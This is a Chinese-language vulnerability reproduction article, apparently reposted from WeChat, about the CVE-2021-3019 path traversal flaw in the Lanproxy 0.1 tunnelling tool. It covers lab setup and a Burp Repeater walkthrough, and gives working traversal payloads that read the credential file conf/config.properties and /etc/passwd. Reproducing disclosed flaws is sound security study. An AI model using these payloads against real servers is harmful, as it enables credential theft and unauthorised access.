> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/XESLeFzXAOQ8JpXbGNqtbQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWhanrkIFAibBic1icRmsiax1icwzTia9vclZBmj278YeMtSWgicBEhZOicmnEraiblJiciaKOuUdg4UoQFYnuia5w/640?wx_fmt=gif)

01: 漏洞概述

Lanproxy 是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持 tcp 流量转发，可支持任何 tcp 上层协议（访问内网网站、本地支付接口调试、ssh 访问、远程桌面等等）本次 Lanproxy 路径遍历漏洞 (CVE-2021-3019) 通过../ 绕过读取任意文件。该漏洞允许目录遍历读取 /../conf/config.properties 来获取到内部网连接的凭据。

  

1

  

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWhanrkIFAibBic1icRmsiax1icwzTia9vclZBmj278YeMtSWgicBEhZOicmnEraiblJiciaKOuUdg4UoQFYnuia5w/640?wx_fmt=gif)

02: 影响版本

lanproxy 0.1

  

2

  

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWhanrkIFAibBic1icRmsiax1icwzTia9vclZBmj278YeMtSWgicBEhZOicmnEraiblJiciaKOuUdg4UoQFYnuia5w/640?wx_fmt=gif)

03: 环境搭建

下载 proxy-server-0.1.zip

下载地址

```
https://file.nioee.com/d/2e81550ebdbd416c933f/
```

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9TRftibwvfUMpWbC0gUnRabmwUWre1brl4ufOPqXgtQggwnib8VwMJyLa9XdNqGDa4qfdwI3kDLX7ibA/640?wx_fmt=png)

解压安装之后移动文件

mv proxy-server-0.1 /usr/local/

  

3

  

接着启动服务

cd /usr/local/proxy-server-0.1/bin

chmod +x startup.sh

./startup.sh

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9TRftibwvfUMpWbC0gUnRabmnBjrPqmrVK75kEk8n1cMBerv3ef5tG6PJEyflVmeA2F7PhOV5tJPMw/640?wx_fmt=png)

  

3

  

访问 http://host_ip:8090 ，即可看到登录界面。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9TRftibwvfUMpWbC0gUnRabmxNvUIF617gtnvtliafBnzyNtKAuryiaYEDzar3Zwx1VkPHdiaFXJe8TXA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWhanrkIFAibBic1icRmsiax1icwzTia9vclZBmj278YeMtSWgicBEhZOicmnEraiblJiciaKOuUdg4UoQFYnuia5w/640?wx_fmt=gif)

04: 漏洞复现

相关 Poc:

```
/../conf/config.properties
```

首先在登陆页面进行抓包

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9TRftibwvfUMpWbC0gUnRabmPkBic1a7LISeu82icfkRKVPHotqiaLnPZkAumic8ODEh0AezQTtuYSh31A/640?wx_fmt=png)

  

4

  

把包发到 REPEATER 以后 在 GET 旁边加上 /../conf/config.properties 来获取到内部网连接的凭据。

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9TRftibwvfUMpWbC0gUnRabmiciakoracxcK7n7bZHYS7Gs0ZU2q5T2ib5ofErTf7VrMPCQe46NbzRwXw/640?wx_fmt=png)

  

4

  

最后读取 passwdPOC:

```
/../../../../../../../../../etc/passwd
```

![](https://mmbiz.qpic.cn/mmbiz_png/tF1M75DDm9TRftibwvfUMpWbC0gUnRabmfXcFlecWWnmBNvLlFiamTwm4ibZP9ibsc5RFjOS5cJ3m1cJBZHibcjEbQA/640?wx_fmt=png)